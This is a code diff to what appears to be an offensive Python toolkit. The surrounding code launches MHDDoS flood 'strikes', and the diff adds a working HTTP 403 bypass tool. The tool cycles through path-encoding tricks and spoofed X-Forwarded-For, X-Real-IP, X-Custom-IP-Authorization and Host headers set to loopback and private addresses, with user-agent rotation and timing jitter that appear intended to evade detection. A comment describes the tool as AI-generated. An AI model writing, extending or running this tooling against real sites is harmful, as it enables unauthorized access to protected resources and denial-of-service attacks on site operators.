@@ -113,3 +113,93 @@ class WebAttacks:
         args = ["python3", path, method, target, "5", str(threads), proxies, "100", str(duration)]
         logger.info("web", f"MHDDoS STRIKE_DISPATCHED: {target} (Method: {method}, Duration: {duration}s)")
         return runner.execute_task(f"MHDDOS_{target}", args, callback=on_output)
+    @staticmethod
+    def bypass_403_test(url, path, on_output=None):
+        """Execute the advanced Bypass 403 sequence."""
+        from shadowcypher.core.config import config
+        logger.info("web", f"BYPASS_403_SEQUENCE_INITIATED: {url}{path}")
+        
+        # Integration logic for the AI-generated tool
+        tool = Bypass403Tool(base_url=url)
+        
+        def _run():
+            results = tool.test_bypass(target_path=path, rate_limit=0.1)
+            for res in results:
+                if res['success']:
+                    msg = f"[SUCCESS] POTENTIAL_BYPASS: {res['url_tested']} (Status: {res['status_code']})"
+                    if on_output: on_output(msg)
+                    logger.info("web", msg)
+                else:
+                    if on_output: on_output(f"[-] Tried: {res['url_tested']} (Status: {res['status_code']})")
+
+        import threading
+        threading.Thread(target=_run, daemon=True).start()
+        return "BYPASS_SEQUENCE_STARTED"
+
+class Bypass403Tool:
+    """
+    A multi-vector tool designed to bypass HTTP 403 Forbidden errors 
+    by manipulating headers, paths, and request structure.
+    """
+    def __init__(self, base_url: str, headers: dict = None):
+        self.base_url = base_url.rstrip('/')
+        self.base_headers = headers if headers else {}
+        import requests, random
+        self.session = requests.Session()
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
+        ]
+        self.session.headers.update({
+            "User-Agent": random.choice(self.user_agents),
+            **self.base_headers
+        })
+
+    def _generate_path_variations(self, path: str) -> list[str]:
+        path = "/" + path.lstrip("/")
+        variations = {path, path.lower(), path.upper()}
+        traversal_paths = [path.replace("/", "/./"), path.replace("/", "/; /")]
+        for tp in traversal_paths: variations.add(tp)
+        variations.add(path.replace("/", "%2f"))
+        return list(variations)
+
+    def _generate_header_payloads(self) -> list[dict]:
+        payloads = []
+        xff_ips = ["127.0.0.1", "192.168.1.1", "10.0.0.1", "::1"]
+        for ip in xff_ips:
+            h = self.base_headers.copy()
+            h['X-Forwarded-For'] = ip
+            h['X-Real-IP'] = ip
+            h['X-Client-IP'] = ip
+            h['X-Custom-IP-Authorization'] = ip
+            payloads.append(h)
+        h_host = self.base_headers.copy()
+        h_host['Host'] = "localhost"
+        payloads.append(h_host)
+        return payloads
+
+    def test_bypass(self, target_path: str, method: str = 'GET', rate_limit: float = 0.1):
+        import time, requests
+        from urllib.parse import urljoin
+        results = []
+        path_variations = self._generate_path_variations(target_path)
+        header_payloads = self._generate_header_payloads()
+        
+        for p_var in path_variations:
+            for h_pay in header_payloads:
+                full_url = urljoin(self.base_url, p_var)
+                try:
+                    r = self.session.request(method, full_url, headers=h_pay, timeout=5)
+                    results.append({
+                        "url_tested": full_url,
+                        "status_code": r.status_code,
+                        "success": 200 <= r.status_code < 400
+                    })
+                except Exception: pass
+                # Random jitter: ±25% of rate_limit
+                import random
+                jitter = rate_limit * (random.uniform(0.75, 1.25))
+                time.sleep(jitter)
+        return results
